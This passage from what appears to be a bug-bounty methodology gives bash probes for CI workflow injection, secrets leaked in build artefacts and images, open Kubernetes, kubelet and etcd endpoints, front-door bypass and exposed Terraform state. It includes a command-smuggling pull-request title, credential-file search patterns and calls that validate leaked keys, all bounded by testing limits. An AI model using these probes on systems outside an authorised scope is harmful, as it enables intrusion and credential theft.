  code goes to the disclosure chapter. A runner registration token seen anywhere is reported unvalidated:
  registering a runner would take real jobs and their secrets. #565883 is the neighbouring flaw: internal services
  behind "Login with GitLab" that trusted an e-mail nobody verified; #410475 is an unauthorised view into a CI/CD
  system.

### CLD-010 · A workflow in an in-scope public repository runs pull-request or issue content with the repository's secrets or a write token

| | |
|---|---|
| **Severity** | Critical standalone when content any GitHub user controls runs in a job holding deployment, registry or cloud secrets; High for a write token alone (push to the default branch, publish a release or package); None when the job has no secrets and a read-only token |
| **Requires** | code-host-token |
| **Excluded by** | — |
| **Unit** | programme |
| **Cost** | high |
| **Weakness** | Inclusion of Functionality from Untrusted Control Sphere · CWE-829 |
| **Prior art** | #1548870, #2471956, #2410111, #2255750 |

- **Where:** the `.github/workflows/*.yml` files of the organisation's public repositories, only where the
  programme's scope lists the repositories or the GitHub organisation. Triggers that run with the base repository's
  secrets and token on input from outside: `pull_request_target`, `workflow_run` (artefacts of a pull-request run),
  `issue_comment`, `issues`, `discussion`, `discussion_comment`, `pull_request_review_comment`. Self-hosted runners in
  public repositories take fork pull requests on the organisation's own machines.
- **Test:** three shapes. A privileged workflow checks out the pull request's own code and runs it (`ref:` set to the
  head SHA or `refs/pull/<n>/merge`, then a build, install or test step). A `run:` or `script:` block expands text any
  GitHub user controls (`${{ github.event.issue.title }}`, a comment body, the head branch name: #2471956 was code
  execution through a pull request's name). A privileged workflow consumes artefacts or caches an untrusted run wrote
  (#2410111, cache poisoning). Read the workflows offline, then prove a candidate on a fork we own, never on the
  organisation's repository.
- **How:**
  ```bash
  D="$E/evidence/@programme/CLD-010"; mkdir -p "$D/wf"; ORG='<GitHub organisation login the scope lists>'
  api(){ curl -sS "${HDR[@]}" -H "Authorization: Bearer $GH_TOKEN" -H 'Accept: application/vnd.github+json' "https://api.github.com/$1"; }
  api "orgs/$ORG/repos?type=public&per_page=100" | jq -r '.[] | select(.archived | not) | .full_name' > "$D/repos.txt"
  while read -r r; do
    api "repos/$r/contents/.github/workflows" | jq -r '.[]? | select(.name | test("\\.ya?ml$")) | .download_url' | while read -r u; do
      curl -sS "${HDR[@]}" -o "$D/wf/${r//\//__}__${u##*/}" "$u"; done; sleep 1
  done < "$D/repos.txt"
  grep -lE '^[[:space:]]*(pull_request_target|workflow_run|issue_comment|issues|discussion|discussion_comment|pull_request_review_comment)[[:space:]]*:' "$D"/wf/* | tee "$D/privileged.txt"
  # 1. checkout of the pull request's own code inside a privileged workflow
  xargs -r -d '\n' grep -nE 'ref:[[:space:]]*\$\{\{[[:space:]]*(github\.event\.pull_request\.head\.(sha|ref)|github\.head_ref)|refs/pull/' < "$D/privileged.txt"
  # 2. text any GitHub user controls, expanded inside run: or script:
  grep -nE '\$\{\{[[:space:]]*(github\.event\.(issue|pull_request|comment|review|review_comment|discussion|head_commit|workflow_run)\.[A-Za-z_.]*(title|body|ref|label|name|message|email)|github\.head_ref)[[:space:]]*\}\}' "$D"/wf/*
  # 3. artefacts or caches from an untrusted run consumed by a privileged one; self-hosted runners in public repositories
  xargs -r -d '\n' grep -nE 'download-artifact|listWorkflowRunArtifacts|actions/cache' < "$D/privileged.txt"; grep -nE 'runs-on:.*self-hosted' "$D"/wf/*
  ```
  ```bash
  # 4. the reproduction runs on our own fork: fork the repository to our account, enable Actions there, add a dummy secret
  #    under the name the workflow uses, and open the pull request (or issue) against our fork from a branch of it, or from a
  #    second GitHub account of ours for a faithful outsider. A marker shows execution with secrets, for example a title of
  #      x"; echo "cld010-$(printf %s "$NPM_TOKEN" | sha256sum | cut -c1-12)"; echo "
  #    or a package.json "preinstall" script in the branch for a checkout-and-build workflow.
  api "repos/<our login>/<repo>/actions/runs?per_page=5" | jq -r '.workflow_runs[] | [.id, .event, .conclusion, .html_url] | @tsv'
  # 5. read-only evidence from the organisation's own history: privileged runs on outside pull requests, and their runners
  api "repos/$ORG/<repo>/actions/runs?event=pull_request_target&per_page=10" | jq -r '.workflow_runs[] | [.id, .head_repository.full_name, .conclusion] | @tsv'
  api "repos/$ORG/<repo>/actions/runs/<run id>/jobs" | jq -r '.jobs[] | [.name, .runner_name, (.labels | join(","))] | @tsv'
  ```
- **Proof:** the workflow file at a fixed commit (permalink with line numbers) showing the trigger, the untrusted
  input and the step that runs it, with the job's `permissions:` and the secrets it references; the run log of our
  fork showing the marker produced from our input with the dummy secret's hash; and, read-only, the organisation's
  run history showing that the workflow runs for outside contributors. No pull request, issue or comment is opened
  against the organisation's repository.
- **Not a finding when:** a `pull_request_target` workflow that checks out the base (its default) and never runs the
  pull request's code. A job gated on a label only maintainers can add, on
  `github.event.pull_request.head.repo.full_name == github.repository`, on `author_association`, or on an
  environment with required reviewers. Untrusted text passed through `env:` and quoted (`"$TITLE"`) instead of
  expanded inline. `permissions: contents: read` and no secrets in the job: nothing to show. The repository is
  archived or the workflow disabled. The repository is outside the programme's scope, or a fork of someone else's
  project (`third-party`). Workflow-scanner output without a reproduction (`automated`).
- **Escalate:** say what the secrets are for (registry publish, cloud deploy, a bot token with organisation-wide
  write) and what a write `GITHUB_TOKEN` allows (push to the default branch, edit releases), and stop. A privileged
  workflow that restores a cache an untrusted run can write is cache poisoning: show it on the fork. #2255750 ($8,000)
  is the same position reached through a CI cache's reusable upload link, and #1548870 ($1,500) a workflow that let
  outsiders modify packages or read secrets. Artefacts these workflows upload go to CLD-011.

### CLD-011 · A public CI log, build artefact or container image of the organisation holds a credential that one identity call shows is live

| | |
|---|---|
| **Severity** | Critical standalone when the credential reaches production, a package registry or the source host with write access; High when it is live with read access to non-public systems; None when the identity call fails |
| **Requires** | — |
| **Excluded by** | — |
| **Unit** | programme |
| **Cost** | high |
| **Weakness** | Insufficiently Protected Credentials · CWE-522 |
| **Prior art** | #496937, #215625, #2412983, #2410111 |

- **Where:** what the organisation's builds publish, once per programme and only for repositories, images and CI
  projects that are its own and that the policy covers. Container images: its Docker Hub namespace, `ghcr.io/<org>`,
  `quay.io/<org>`, the public ECR gallery, images named in its compose files, Helm charts and manifests. CI outputs:
  GitHub Actions artefacts and logs of its public repositories, GitLab public pipelines' job logs and artefacts,
  Travis CI and CircleCI builds of public projects (#496937 and #215625 were tokens in Travis CI logs). The
  repository files and their history are INF-015's card. No capability gates the image part; the GitHub artefact
  download needs `GH_TOKEN` of our own account, and a note without it says that artefacts were not checked.
- **Test:** build arguments, copied configuration and checked-out credentials end up in published outputs: `ENV`
  values and `ARG` lines in an image's history, `.env`, `.npmrc`, `.docker/config.json`, `.git-credentials` or
  `id_rsa` in a layer, the `.git/config` that `actions/checkout` writes (its `extraheader` carries a token) inside an
  artefact, a secret echoed by a build step. Read each image's configuration before any layer, open a layer only when
  the history points at one, scan offline, and validate one credential with one identity call.
- **How:**
  ```bash
  D="$E/evidence/@programme/CLD-011"; mkdir -p "$D/img" "$D/art"; NS='<Docker Hub namespace of the organisation>'
  # 1. public images, then one image's configuration (environment names and build history) before any layer
  curl -sS "${HDR[@]}" "https://hub.docker.com/v2/repositories/$NS/?page_size=100" | jq -r '.results[] | [.name, .last_updated] | @tsv' | tee "$D/images.tsv"
  REPO="$NS/<image from images.tsv>"; TAG=latest
  TOK=$(curl -sS "${HDR[@]}" "https://auth.docker.io/token?service=registry.docker.io&scope=repository:$REPO:pull" | jq -r .token)
  RA=(-H "Authorization: Bearer $TOK" -H 'Accept: application/vnd.oci.image.index.v1+json, application/vnd.docker.distribution.manifest.list.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json')
  curl -sS "${HDR[@]}" "${RA[@]}" "https://registry-1.docker.io/v2/$REPO/manifests/$TAG" > "$D/img/manifest.json"
  DG=$(jq -r '.manifests[]? | select(.platform.architecture == "amd64") | .digest' "$D/img/manifest.json" | head -1)    # an index: take amd64
  [ -n "$DG" ] && curl -sS "${HDR[@]}" "${RA[@]}" "https://registry-1.docker.io/v2/$REPO/manifests/$DG" > "$D/img/manifest.json"
  curl -sSL "${HDR[@]}" -H "Authorization: Bearer $TOK" "https://registry-1.docker.io/v2/$REPO/blobs/$(jq -r .config.digest "$D/img/manifest.json")" > "$D/img/config.json"
  jq -r '.config.Env[]?, .history[]?.created_by' "$D/img/config.json" | grep -inE 'key|secret|token|passw|auth|credential|npmrc|aws_' | cut -c1-200
  # 2. a layer only when the history points at copied configuration: list its names, extract only the matches
  jq -r '.layers[] | [.digest, .size] | @tsv' "$D/img/manifest.json"
  L='<layer digest>'; curl -sSL "${HDR[@]}" -H "Authorization: Bearer $TOK" -o "$D/img/layer.tgz" "https://registry-1.docker.io/v2/$REPO/blobs/$L"
  tar -tzf "$D/img/layer.tgz" | grep -iE '(^|/)(\.env|\.npmrc|\.pypirc|\.netrc|\.git-credentials|credentials|config\.json|id_rsa|settings\.xml|[^/]*\.tfstate)$' | tee "$D/img/hits.txt"
  [ -s "$D/img/hits.txt" ] && mkdir -p "$D/img/x" && tar -xzf "$D/img/layer.tgz" -C "$D/img/x" -T "$D/img/hits.txt"   # zstd layers: tar --zstd
  ```
  ```bash
  # 3. GitHub Actions artefacts of the organisation's public repositories (the listing is public, the download needs GH_TOKEN)
  ORG='<GitHub organisation login>'
  for r in $(curl -sS "${HDR[@]}" "https://api.github.com/orgs/$ORG/repos?type=public&per_page=100" | jq -r '.[].full_name'); do
    curl -sS "${HDR[@]}" "https://api.github.com/repos/$r/actions/artifacts?per_page=20" \
      | jq -r --arg r "$r" '.artifacts[]? | select(.expired | not) | [$r, .id, .name, .size_in_bytes, .created_at] | @tsv'; sleep 1
  done | tee "$D/artefacts.tsv"
  RP='<owner/repo>'; ID='<artifact id>'
  curl -sSL "${HDR[@]}" -H "Authorization: Bearer $GH_TOKEN" -o "$D/art/$ID.zip" "https://api.github.com/repos/$RP/actions/artifacts/$ID/zip"
  unzip -l "$D/art/$ID.zip" | grep -iE '\.git/config|\.env|credentials|\.npmrc|tfstate|id_rsa|\.pem'
  unzip -p "$D/art/$ID.zip" '*.git/config' 2>/dev/null | grep -iE 'extraheader|url ='
  # 4. one identity call for one credential, then stop (values from the hit; ASIA keys also need -H "x-amz-security-token: $ST")
  AK='<AKIA...>'; SK='<its secret>'; K='<token>'
  curl -sS "${HDR[@]}" --aws-sigv4 'aws:amz:us-east-1:sts' --user "$AK:$SK" 'https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15' | grep -oE '<(Arn|Account)>[^<]+'
  curl -sS "${HDR[@]}" -D- -o /dev/null -H "Authorization: Bearer $K" https://api.github.com/user | grep -iE '^x-oauth-scopes'     # ghp_ gho_ github_pat_
  curl -sS "${HDR[@]}" -H "Authorization: Bearer $K" https://registry.npmjs.org/-/whoami                                          # npm_
  curl -sS "${HDR[@]}" -u "<docker user>:$K" 'https://auth.docker.io/token?service=registry.docker.io' | jq -r 'if .token then "valid" else . end'   # dckr_pat_
  ```
  A Google service-account key has no read-only call short of its token exchange: report it unvalidated with its
  `client_email` and `private_key_id`, or make that one exchange (`gcloud auth activate-service-account
  --key-file=<file>` then `gcloud auth print-access-token`) and nothing else. Azure storage keys and connection
  strings are reported unvalidated; a SAS token's fields are read offline.
- **Proof:** where the credential sits (image, tag and digest, layer and path; or repository, run and artefact id),
  since when it has been public (`last_updated`, `created_at`), the line with the value cut to four characters each
  side, and the identity call's output naming the principal, with the time of the call. One call, no other use.
- **Not a finding when:** the identity call fails (rotated, revoked, expired). A `GITHUB_TOKEN` or
  `ACTIONS_RUNTIME_TOKEN` inside an artefact lives only while its job runs: an expired one shows a weak workflow, not
  a live credential. Example values and fixtures (`AKIAIOSFODNN7EXAMPLE`, `changeme`, a test key for a mock service).
  A build argument named in the history whose value no layer stores. An image or artefact of a customer, a
  contributor's fork or a vendor (`third-party`). Expired artefacts are gone.
- **Escalate:** a registry or package token is a supply-chain position: describe what it could publish, never
  publish. A cloud key: describe what the role name suggests, and stop. A state file in a layer or artefact is
  CLD-014. The image's configuration names internal hosts, buckets and services: feed them to CLD-001, CLD-012 and
  recon. #2412983 was a Sentry token in a public Docker Hub image; #2410111 a Docker secret reached through a poisoned
  Actions cache (CLD-010).

### CLD-012 · A container registry, Kubernetes API, kubelet or etcd of the organisation answers a read-only request from an anonymous identity or any cloud account

| | |
|---|---|
| **Severity** | Critical standalone when the identity can read secrets, exec into pods, or push images the organisation runs; High for pod specifications, image configuration, private images or etcd keys; Medium for names only (namespaces, repositories) |
| **Requires** | known-product |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Missing Authentication for Critical Function · CWE-306 |
| **Prior art** | #455645, #179103, #1989884, #1317236 |

- **Where:** a registry answering `/v2/` with `Docker-Distribution-Api-Version: registry/2.0` (`registry.`,
  `docker.`, `cr.` hosts; ports 443, 5000, 5001); a Kubernetes API (`/version` returns `gitVersion`; ports 6443,
  443, 8443; EKS and AKS endpoint names in certificates and kubeconfigs); a kubelet on 10250 (HTTPS) or the old
  read-only port 10255; etcd on 2379. CVE-008 holds a one-request row for some of these; this card is the full
  read-only test for the container platform.
- **Test:** the platform's own authorisation decides, and the identities to try are anonymous and, on GKE, any
  Google account at all: every Google identity is `system:authenticated` there, so a binding to that group admits
  everyone. Registry: catalogue, tags, one manifest and its configuration. Kubernetes: one list request, then a
  `SelfSubjectRulesReview`, which reports what the caller may do and creates nothing. Kubelet: pod names. etcd: key
  names. Stop at names; no `exec`, no job, no write.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-012"; mkdir -p "$D"; HN=$(printf '%s\n' "$T" | sed -E 's#^[a-z]+://##; s#[:/].*##')
  # registry: catalogue, tags, one manifest and its configuration (variable names and history, values cut)
  curl -sSk "${HDR[@]}" -D "$D/v2.headers" -o /dev/null -w '%{http_code} /v2/\n' "$T/v2/"; grep -iE '^(docker-distribution-api-version|www-authenticate):' "$D/v2.headers"
  curl -sSk "${HDR[@]}" "$T/v2/_catalog?n=50" | tee "$D/catalog.json" | jq -r '.repositories[]?' | head -50
  R=$(jq -r '.repositories[0] // empty' "$D/catalog.json"); TG=$(curl -sSk "${HDR[@]}" "$T/v2/$R/tags/list" | jq -r '.tags[0] // empty')
  curl -sSk "${HDR[@]}" -H 'Accept: application/vnd.oci.image.manifest.v1+json, application/vnd.docker.distribution.manifest.v2+json' "$T/v2/$R/manifests/$TG" > "$D/manifest.json"
  curl -sSkL "${HDR[@]}" "$T/v2/$R/blobs/$(jq -r .config.digest "$D/manifest.json")" \
    | jq '{env: [.config.Env[]? | sub("=.*"; "=...")], history: [.history[]?.created_by][0:15]}' > "$D/config-summary.json"
  # Kubernetes API: anonymous, then (GKE) as any Google account with our own token
  curl -sSk "${HDR[@]}" "$T/version" | jq -c '{gitVersion, platform}'
  curl -sSk "${HDR[@]}" -o "$D/ns.anon.json" -w '%{http_code} namespaces, anonymous\n' "$T/api/v1/namespaces?limit=5"; jq -r '.items[]?.metadata.name, .message? // empty' "$D/ns.anon.json"
  source "$E/accounts/cloud.env"     # GCP_TOKEN=$(gcloud auth print-access-token) of our own Google account
  RV='{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'
  for who in anonymous google; do AU=(); [ "$who" = google ] && AU=(-H "Authorization: Bearer $GCP_TOKEN")
    curl -sSk "${HDR[@]}" "${AU[@]}" -X POST "$T/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -H 'Content-Type: application/json' -d "$RV" \
      | jq -c '.status.resourceRules[]? | {verbs, apiGroups, resources}' > "$D/rules-$who.txt"; echo "$who: $(wc -l < "$D/rules-$who.txt") rules"; done
  curl -sSk "${HDR[@]}" -o /dev/null -w '%{http_code} secrets, anonymous (status only, the body is never stored)\n' "$T/api/v1/secrets?limit=1"
  # kubelet on the same host: pod names only, because pod specifications carry environment values
  curl -sSk "${HDR[@]}" "https://$HN:10250/pods" | jq -r '.items[]? | .metadata.namespace + "/" + .metadata.name' | head -20 | tee "$D/kubelet-pods.txt"
  curl -sS "${HDR[@]}" -m 10 "http://$HN:10255/pods" | jq -r '.items[]? | .metadata.namespace + "/" + .metadata.name' | head -5
  # etcd: version, then five key names (keys_only); etcd 3.3 answers on /v3beta/, and some listen on plain http
  curl -sSk "${HDR[@]}" "https://$HN:2379/version"; echo
  curl -sSk "${HDR[@]}" -X POST "https://$HN:2379/v3/kv/range" -d '{"key":"AA==","range_end":"AA==","keys_only":true,"limit":5}' | jq -r '.kvs[]?.key | @base64d'
  ```
  ```bash
  # only where the policy allows write tests: start a blob upload to a new repository name of ours and cancel it.
  # Never push a manifest or a tag, never write to an existing repository.
  L=$(curl -sSk "${HDR[@]}" -X POST -D- -o /dev/null "$T/v2/h1-sane-test/blobs/uploads/" | grep -i '^location:' | awk '{print $2}' | tr -d '\r')
  echo "upload session: ${L:-refused}"
  [ -n "$L" ] && { case "$L" in http*) UL="$L" ;; *) UL="$T$L" ;; esac; curl -sSk "${HDR[@]}" -X DELETE -o /dev/null -w '%{http_code} cancelled\n' "$UL"; }
  ```
- **Proof:** registry: the catalogue, one tag list and the configuration summary (variable names, history lines),
  with `/v2/` answering without a `WWW-Authenticate` challenge. Kubernetes: the anonymous or any-Google-account
  request and its answer (namespace names, or the rules review listing verbs on resources), and the status code for
  `secrets`. Kubelet: pod names and their count. etcd: five key names. Nothing executed or written, or the cancelled
  upload session.
- **Not a finding when:** `/v2/` answers 401 with a `Bearer realm` and the token service refuses an anonymous
  catalogue scope. The registry serves public images on purpose: an open-source project's, a Harbor public project,
  a pull-through cache of public images. `/version`, `/healthz`, `/livez` and `/readyz` are public on every cluster
  (`version-disclosure`); `system:anonymous` refused with 403 is closed; a rules review that lists only
  `selfsubjectaccessreviews`, `selfsubjectrulesreviews` and non-resource URLs is the default `system:basic-user`. A
  kubelet 401 is webhook authentication working. etcd that asks for a client certificate. Many unrelated services
  open on one address: a honeypot. A control plane that belongs to someone else (`third-party`).
- **Escalate:** never `exec`, `attach`, `portforward`, the kubelet's `/run`, a pod or job create, or a secret value:
  describe what the rules allow. The $25,000 report (#455645) was an API on which the researcher ran jobs as
  cluster-admin; this card stops at the rules review that shows the same. Image configuration and layers with
  credentials follow CLD-011's identity rule (#179103: source code and secret keys in an open registry). A registry
  that accepts uploads lets anyone replace an image the organisation deploys: report it from the cancelled session.
  Internal names from pods and images feed recon and SSR-010.

### CLD-013 · The backend's provider host name, function URL or API Gateway stage answers a request that the asset's front door refuses

| | |
|---|---|
| **Severity** | High standalone when the direct route returns data or actions that the front door gates behind a login, a signature or an address rule; Medium when only the WAF is skipped and a payload it blocks reaches the application; None when the origin serves only what the front door serves |
| **Requires** | cdn\|reverse-proxy\|api |
| **Excluded by** | — |
| **Unit** | host |
| **Cost** | medium |
| **Weakness** | Authentication Bypass Using an Alternate Path or Channel · CWE-288 |
| **Prior art** | #687908, #776933, #1531183, #2262939 |

- **Where:** the names the same backend answers on besides this host: the provider's own host names in bundles and
  responses (`<id>.execute-api.<region>.amazonaws.com/<stage>`, `<id>.lambda-url.<region>.on.aws`,
  `*.cloudfunctions.net`, `*.run.app`, `*.azurewebsites.net`, `*.azure-api.net`, `*.elb.amazonaws.com`,
  `*.cloudfront.net`, `*.appspot.com`), the CNAME chain of this host, origin addresses that the host's certificate or
  DNS history ties to it, and the response headers that name the provider (`x-amz-cf-id`, `x-amz-apigw-id`,
  `apigw-requestid`, `x-amzn-requestid`, `x-azure-ref`, `x-cloud-trace-context`, `Server: AmazonS3`).
- **Test:** the control lives at the front door (a CDN or WAF rule, an authoriser on the custom domain, Lambda@Edge
  or an identity-aware proxy checking the login, signed cookies, an IP or country rule, mutual TLS on an API Gateway
  custom domain) and the backend answers on a second name that skips it. An API Gateway stage serves its own
  deployment, so an older `dev` or `test` stage can still hold methods without the authoriser `prod` has. Send the
  request the front door refuses, unchanged, to each other name, and compare status and body.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-013"; mkdir -p "$D"
  # 1. the provider behind this host name, and provider host names the client code calls
  dig +short CNAME "$H" | tee "$D/cname.txt"
  curl -sS "${HDR[@]}" -D- -o /dev/null "$T/sane$RANDOM" | grep -iE '^(server|via|x-amz-cf-id|x-amz-cf-pop|x-amz-apigw-id|apigw-requestid|x-amzn-requestid|x-amz-bucket-region|x-azure-ref|x-ms-request-id|x-cloud-trace-context|x-goog-[a-z-]+):' | tee "$D/edge.headers"
  grep -rhoE '[a-z0-9-]+\.(execute-api\.[a-z0-9-]+\.amazonaws\.com|lambda-url\.[a-z0-9-]+\.on\.aws|cloudfunctions\.net|run\.app|azurewebsites\.net|azure-api\.net|elb\.amazonaws\.com|cloudfront\.net|appspot\.com)' "$E/recon/$H/" 2>/dev/null | sort -u | tee "$D/provider-names.txt"
  # 2. a request the front door refuses, sent unchanged to every provider name
  P='/api/v1/account'      # from the proxy history: a path that answers 401 or 403 at $T (login-only, signed-only, address-restricted)
  curl -sS "${HDR[@]}" -o "$D/front.body" -w "%{http_code} %{size_download} front door $P\n" "$T$P"
  while read -r N; do curl -sS "${HDR[@]}" -m 15 -o "$D/direct-$N.body" -w "%{http_code} %{size_download} $N\n" "https://$N$P"; sleep 1; done < "$D/provider-names.txt"
  # 3. API Gateway: the same resource on the other stages of the same API id
  API=$(grep -m1 -oE '[a-z0-9]+\.execute-api\.[a-z0-9-]+\.amazonaws\.com' "$D/provider-names.txt")
  [ -n "$API" ] && for s in prod production dev develop test staging stage beta qa uat v1 v2 internal; do
    curl -sS "${HDR[@]}" -o /dev/null -w "%{http_code} %{size_download} stage /$s\n" "https://$API/$s$P"; sleep 1; done
  # 4. an origin address: first its certificate must name this host, then the same request under this host's name
  OIP='<origin address from DNS history or certificate search>'
  openssl s_client -connect "$OIP:443" -servername "$H" </dev/null 2>/dev/null | openssl x509 -noout -subject -ext subjectAltName
  curl -sS "${HDR[@]}" --resolve "$H:443:$OIP" -o "$D/origin.body" -w "%{http_code} %{size_download} origin $OIP\n" "$T$P"
  ```
  An origin address is tested only when `scripts/sane scope check` accepts it or the programme treats it as this
  host's origin; addresses change hands (cloud IP churn), so the certificate check comes first.
- **Proof:** the request refused at the front door and the same request answered through the provider name, stage
  or origin address (status, size, the start of a body with our own or non-sensitive data); what ties the two names
  to one application (an identical public response, the same build id or error format); and what ties the name to
  the organisation (it is in the asset's bundles or DNS, or the origin's certificate names the host).
- **Not a finding when:** the provider name serves exactly what the custom domain serves to everyone: knowing the
  origin is not a finding (the disclosure chapter's graveyard says the same). The front door adds only caching or
  TLS. The origin repeats the control (401 there too). Only the WAF is skipped and no payload it blocks reaches a
  sink that matters: origin-IP and WAF-bypass titles pay little (#776933 at $200, #1531183 at $100). The other stage
  answers with test data from a test database and no production credential works there. The address belongs to a
  shared host or to someone else now.
- **Escalate:** a skipped WAF makes the injection cards worth re-running through the origin with the payload the
  edge blocked. A stage without its authoriser that serves production data is API-014. An S3 origin's name (from an
  error body, the bundles or old DNS) goes to CLD-001. A CloudFront behaviour that routes to a bucket that no longer
  exists is a takeover (#2262939, rubygems.org serving content from an unclaimed bucket): the takeover chapter.
  #687908 shows the full shape: origin addresses that led to an open Grafana and PgHero.

### CLD-014 · A Terraform state file of the organisation is readable from the web root, a bucket or a CI artefact and holds live secrets

| | |
|---|---|
| **Severity** | Critical standalone when the state holds a production cloud key that one identity call proves live, a database password or a private key; High for live secrets that cannot be validated without using them; Medium for a state with resource ids and network layout only |
| **Requires** | http\|cloud-storage |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Information Disclosure · CWE-538 |
| **Prior art** | #963384, #3382796, #872190, #2401648 |

- **Where:** the web root and deploy folders of the host (`/terraform.tfstate`, `terraform.tfstate.backup`, the
  `.terraform/terraform.tfstate` backend pointer, `*.tfvars`, `/infra/`, `/terraform/`, `/deploy/`), `.tfstate` keys
  in the buckets the asset uses, state buckets named after the organisation (CLD-003's `tfstate` and `terraform`
  candidates), and CI artefacts (CLD-011). No report in the index names Terraform state; the cited ones are
  infrastructure files and buckets that exposed credentials the same way: MySQL credentials in a served
  `docker-compose.yml` (#963384), configuration files in a public bucket (#3382796), a plaintext password in a release
  bucket (#872190), two AWS key pairs with database credentials (#2401648, rated critical).
- **Test:** a state file records every attribute of every managed resource in plain text, including those Terraform
  marks sensitive: database passwords, generated passwords, IAM access keys created by Terraform, private keys,
  kubeconfigs, secret-manager values, sensitive outputs. The local `.terraform/terraform.tfstate` names the remote
  state's bucket, key and region. Fetch the candidates, confirm a real state, read structure and attribute names
  with values cut, and validate one cloud key with one identity call.
- **How:**
  ```bash
  D="$E/evidence/$H/CLD-014"; mkdir -p "$D"; W=$(awk -v r="$RATE" 'BEGIN{printf "%.2f", 1/r}')
  # 1. state and variable files under the web root, beside a control of the same shape
  curl -sS "${HDR[@]}" -o /dev/null -w "CONTROL %{http_code} %{size_download} %{content_type}\n" "$T/sane$RANDOM.tfstate"
  for p in /terraform.tfstate /terraform.tfstate.backup /.terraform/terraform.tfstate /.terraform/environment /terraform.tfvars \
           /terraform.auto.tfvars /prod.tfvars /production.tfvars /infra/terraform.tfstate /terraform/terraform.tfstate \
           /deploy/terraform.tfstate /tf/terraform.tfstate /ops/terraform.tfstate /.terraform.lock.hcl /main.tf; do
    curl -sS "${HDR[@]}" -r 0-2097151 -o "$D/web$(printf %s "$p" | tr '/' '_')" -w "%{http_code} %{size_download} %{content_type} $p\n" "$T$p"; sleep "$W"
  done | tee "$D/sweep.txt"
  # 2. .tfstate keys in the S3 buckets the asset names (anonymous listings; key names only)
  for b in $(grep -rhoiE '[a-z0-9][a-z0-9.-]{1,61}[a-z0-9]\.s3[.-]([a-z0-9-]+[.-])*amazonaws\.com' "$E/recon/$H/" 2>/dev/null | tr 'A-Z' 'a-z' | sed -E 's#\.s3[.-].*##' | sort -u); do
    curl -sS "${HDR[@]}" "https://$b.s3.amazonaws.com/?list-type=2&max-keys=1000" | grep -oE '<Key>[^<]*\.tfstate(\.backup)?</Key>' | sed "s#^#$b #"; sleep "$W"
  done | tee "$D/bucket-states.txt"
  ```
  ```bash
  # 3. read a state without printing secrets: version, backend, resource types, secret-bearing attribute paths with values cut
  for f in "$D"/web_*; do jq -e '.lineage' "$f" >/dev/null 2>&1 || continue; echo "== $f"
    jq -c '{terraform_version, serial, backend: .backend}' "$f"
    jq -r '.resources[]? | "\(.type).\(.name)"' "$f" | sort | uniq -c | sort -rn | head -25
    jq -r '.resources[]? | .type as $t | .name as $n | .instances[]? | (.attributes // {}) | to_entries[]
      | select(.key | test("password|secret|private_key|token|access_key|connection_string|kube_config|result$"))
      | select(.value | type == "string" and length > 8) | "\($t).\($n).\(.key) = \(.value[0:4])...\(.value[-4:])"' "$f" | head -30
    jq -r '.outputs // {} | to_entries[] | select(.value.sensitive == true) | "output \(.key) (sensitive)"' "$f"
  done
  # 4. the remote state the backend pointer names (S3 backend), fetched anonymously; then one identity call for one cloud key
  PT="$D/web_.terraform_terraform.tfstate"; BB=$(jq -r '.backend.config.bucket // empty' "$PT" 2>/dev/null); BK=$(jq -r '.backend.config.key // empty' "$PT" 2>/dev/null)
  [ -n "$BB" ] && curl -sS "${HDR[@]}" -o "$D/remote.tfstate" -w "%{http_code} %{size_download} remote state $BB/$BK\n" "https://$BB.s3.amazonaws.com/$BK"
  AK='<AKIA... from the state>'; SK='<its secret>'
  curl -sS "${HDR[@]}" --aws-sigv4 'aws:amz:us-east-1:sts' --user "$AK:$SK" 'https://sts.amazonaws.com/?Action=GetCallerIdentity&Version=2011-06-15' | grep -oE '<(Arn|Account)>[^<]+'
  ```
- **Proof:** the response as served (status, content type, the first bytes showing `terraform_version` and
  `lineage`), the resource-type summary, the secret-bearing attribute paths with values cut to four characters each
  side, and one identity call for one cloud key, with its time. Database passwords, private keys and tokens without
  an identity call are listed by path and never used.
- **Not a finding when:** the 200 is the single-page app's shell or a soft 404 (`jq -e .lineage` fails). The state
  of a tutorial or a module's test fixture (resources named `example`, account id `123456789012`, only
  `null_resource` and `local_file`). `main.tf`, a `*.tfvars` without secrets or `.terraform.lock.hcl` alone: they
  name providers, versions and layout (`version-disclosure`, `internal-info`). Keys the identity call shows dead in
  an old state (a low `serial`, resources that no longer resolve). INF-002 also requests `/terraform.tfstate`; the two
  records are one finding.
- **Escalate:** the state maps the infrastructure: bucket names to CLD-001 and CLD-002, cluster endpoints and
  registry hosts to CLD-012, database and cache hosts to the network chapter (no connection with the passwords). An S3
  backend keeps other workspaces' states under `env:/<workspace>/`: names only. An IAM key created by Terraform
  (`aws_iam_access_key`) is usually live while the resource exists: one identity call, then report at once.

## Graveyard

- **A bucket that is public on purpose.** Static assets, a CDN origin, a download mirror, a public dataset. A listing
  of what the site already links is informative (#222724: one of two reported buckets was public by design). Read
  the key names before writing anything.
- **A bucket name, `AccessDenied` or a 403.** It proves the bucket exists, nothing more. `NoSuchBucket` for a name the
  asset references is the takeover chapter's (`takeover`; a claim only with `takeover-ok`).
- **"Any authenticated AWS user" can list content that is public anyway.** 15 reports by title, 5 paid, median
  $140: it pays only for what the listing exposes.
- **Buckets that are not the organisation's.** A guessed name with no tie to it, a squatted name, a researcher's
  canary bucket, or a vendor's shared bucket that the site merely uses (`third-party`).
- **Identifiers that are public by design.** Firebase web configuration, Cognito user-pool, client and identity-pool
  ids, bucket names, API Gateway ids. The finding is in the rules or the role behind them, as the disclosure chapter
  says for keys.
- **Writes nobody reads.** A marker accepted into a bucket nothing serves or processes is storage abuse at best, and
  programmes that list unrestricted uploads among their exclusions close it.
- **Headers and transport on bucket-hosted pages.** No security headers on an S3 website (#149572), objects served
  over plain HTTP (#43280), user content marked cacheable (#163131): `missing-headers`, `clickjacking`, `ssl-tls`,
  `mitm`.
- **The origin address, or a WAF the origin does not repeat, with nothing behind it.** 16 reports by title name an
